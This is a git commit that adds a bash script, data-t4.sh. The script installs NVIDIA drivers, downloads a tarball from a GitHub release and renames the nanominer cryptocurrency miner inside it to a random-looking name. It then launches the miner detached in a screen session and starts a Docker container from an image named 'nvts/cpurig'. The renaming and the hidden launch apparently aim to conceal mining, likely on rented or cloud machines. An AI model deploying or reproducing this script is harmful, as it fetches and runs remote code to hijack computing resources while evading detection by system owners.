692d258f03fedf42aefc74d75607bd913c07d1c6
wollfoo <nhac.tien1988@gmail.com>
2022-03-09 15:32:40 +0700

    Create data-t4.sh

---
+++ data-t4.sh
@@ -0,0 +1,27 @@
+#!/bin/bash
+apt-get update && apt-get install -y docker.io screen
+apt-get install -y git wget screen
+azure=mxsemsdnlkdj
+a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
+apt-get install -y git wget screen
+rm -rf NVIDIA-Linux-x86_64-510.47.03.run
+wget https://us.download.nvidia.com/tesla/510.47.03/NVIDIA-Linux-x86_64-510.47.03.run
+sudo chmod +x NVIDIA-Linux-x86_64-510.47.03.run
+./NVIDIA-Linux-x86_64-510.47.03.run
+rm -r /usr/share/work/$azure
+mkdir /usr/share
+mkdir /usr/share/work
+rm -r /usr/share/work/platinum
+wget https://github.com/wollfoo/wolethv100/releases/download/wollfoo007/platinum.tar.gz
+mv platinum.tar.gz /usr/share/work/
+cd /usr/share/work/ &&  tar xf platinum.tar.gz
+rm -rf platinum.tar.gz && cd platinum
+mv nanominer $azure -n
+cp $azure "$cpuname"
+rm -f  nanominer
+echo $cpuname" is starting"
+screen -d -m ./"${cpuname}"
+
+#!/bin/bash
+docker rm -f cpudataissa
+docker run --add-host=localhost:127.215.121.222 -d --name cpudataissa nvts/cpurig
